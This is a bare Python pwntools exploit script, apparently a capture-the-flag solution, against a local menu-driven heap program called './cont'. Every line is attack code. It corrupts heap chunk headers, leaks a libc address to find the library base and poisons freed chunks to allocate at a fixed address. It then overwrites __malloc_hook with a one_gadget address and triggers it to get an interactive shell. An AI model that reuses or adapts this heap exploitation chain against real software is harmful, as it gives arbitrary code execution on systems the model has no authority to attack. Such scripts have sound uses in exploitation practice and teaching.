from pwn import *
def cmd(c):
	p.sendlineafter(">> ",str(c))
def setname(name,):
	p.readuntil("name: ")
	p.sendline(name)
def add(idx,l,c):
	cmd(1)
	p.readuntil("Index: ")
	p.sendline(str(idx))
	p.readuntil("Length: ")
	p.sendline(str(l))
	p.readuntil("age: ")
	p.sendline(c)
def magic(idx,l,c):
	cmd(1)
	p.readuntil("Index: ")
	p.sendline(str(idx))
	p.readuntil("Length: ")
	p.sendline(str(l))
	p.readuntil("though\n")
	p.sendline(c)

def show(idx):
	cmd(3)
	p.readuntil("Index: ")
	p.sendline(str(idx))
def free(idx):
	cmd(4)
	p.readuntil("Index: ")
	p.sendline(str(idx))
p=process("./cont")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
#context.log_level='debug'
setname("nier")
p.readuntil("n) ")
p.sendline("y")
p.readuntil("d: ")
p.sendline("A"*0x18+p64(0x31))
add(0,0x20,"a")
add(1,0x20,"a")
add(2,0x20,"a")
add(3,0x20,"a")
magic(4,0x100,"a"*0x28+p64(0x11))
free(0)
free(1)
free(2)
free(3)
add(0,0x18,"b")
show(0)
p.readuntil(": ")
base=u64(p.read(6).ljust(8,'\x00'))-(0x7ffff7dd0a62-0x00007ffff7a0d000)
log.warning(hex(base))

libc.address=base
add(1,0x20,"b")
add(2,0x20,"c")
free(2)
free(1)
magic(1,0x100,"A"*0x28+p64(0x31)+p64(0x602A50))
add(2,0x20,"A")
magic(3,0x200,p64(0x0020002000200020)*2+p64(0x602A60)*3+p64(libc.symbols['__malloc_hook']))
context.log_level='debug'
cmd(2)
one=base+0xf02a4
p.sendline(p64(one))
free(0)
p.interactive()



